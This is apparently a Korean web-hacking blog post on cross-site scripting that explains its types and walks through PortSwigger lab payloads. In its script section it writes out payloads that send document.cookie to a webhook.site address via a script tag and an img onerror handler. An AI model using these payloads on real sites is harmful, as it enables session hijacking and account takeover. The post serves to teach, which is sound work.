---
title: "XSS(Cross Site Script)"
date: 2023-09-13 +0900
img_path: /assets/img/posts/xss_cross_site_script
categories: [Web-Hacking]
tags: ['web', 'xss', 'client side attack', '2023']
---
## XSS란?

XSS는 **Cross Site Script**의 약어로써 공격자가 웹 리소스에 **악성 스크립트를 삽입**하는 공격입니다.

웹 이용자는 해당 스크립트를 실행시키면서 계정의 세션 정보를 탈취 당할 수 있고, 공격자는 세션정보를 통해 다른 이용자의 계정으로 임의의 기능을 수행할 수 있습니다.

### XSS는 언제 발생되는가?

- 사용자의 입력한 내용을 그대로 출력하는 기능에서 주로 발생합니다.
- HTML, CSS, JS와 같은 코드가 포함된 게시물을 조회할 경우 공격자가 입력한 스크립트가 실행될 수 있습니다.

### XSS 종류

| 종류 | 설명 |
| :--- | :--- |
| Reflected XSS | 악성 스크립트가 URL에 삽입되고 서버의 응답에 담겨오는 XSS |
| Stored XSS | 악성 스크립트가 서버에 저장되고 서버의 응답에 담겨오는 XSS |
| Dom-based XSS | 악성 스크립트가 DOM 내부의 동작을 통해서 실행되는 XSS |
| Universal XSS | 클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점으로 SOP 정책을 우회하는 XSS |

## XSS 스크립트

스크립트를 삽입할 수 만 있다면 JS로 원하는 기능들을 수행할 수 있습니다(CORS, SOP 같은 mitigation으로 인해서 실행에 제약이 걸리는 경우를 제외하면…).

아래와 같이 `alert(1)` 을 이용해 창을 띄워서 XSS가 가능한지 테스트를 하거나, cookie를 탈취하는 스크립트를 주로 사용합니다.

또한 스크립트를 작성할 때 `<script>` 태그를 사용해주기도 하고 `onerror`, `onload` 와 같은 Event Listner를 통해서 JS 코드를 실행시키기도 합니다.



```jsx
<script>alert(1)</script>
<script>location.href='https://webhook.site/.../?x='+document.cookie</script>
<img src=x onerror="location.href='https://webhook.site/.../?x='+document.cookie">
...
```

> **위의 예시 외에도 여러가지 방법으로 스크립트를 작성할 수 있고, 필터링이 되었을 때 우회하는 방법도 존재합니다.**
{: .prompt-info }

## Reflected XSS

- 서버가 악성 스크립트가 담긴 요청을 출력할 때 발생합니다.
- 검색창을 통해 스크립트를 포함해서 검색하는 방식이 있습니다.
- Click Jacking 또는 Open Redirect 등 다른 취약점과 연계해서 사용됩니다.

다음은 PostSwigger에서 만든 [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded) 공격 실습 사이트에서 XSS 공격을 시도한 payload와 성공 화면입니다.

```
GET /?search=<script>alert(1)</script> HTTP/2
```

![Untitled.png](Untitled.png)
_Reflect XSS로 alert창을 띄운 화면_

## Stored XSS

- 서버에 데이터베이스 또는 파일 등으로 저장된 컨텐츠를 조회할 때 발생하게 됩니다.
- 주로 게시글 또는 댓글을 업로드할 때 악성 스크립트를 포함시키는 방식이 있습니다.

다음은 PostSwigger에서 만든 [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded) 공격 실습 사이트에서 XSS 공격을 시도한 payload와 성공 화면입니다.

```
POST /post/comment HTTP/2
Host: 0a6100980435d4358088942100db000f.web-security-academy.net
...

Id=5&comment=<img src=x onerror=alert(1)>&name=asdf&email=asdf%40asdf.adsf&website=
```

![Untitled%201.png](Untitled%201.png)
_사용자가 입력한 스크립트가 그대로 삽입된 것을 볼 수 있다_

![Untitled%202.png](Untitled%202.png)
_Stored XSS로 alert창을 띄운 화면_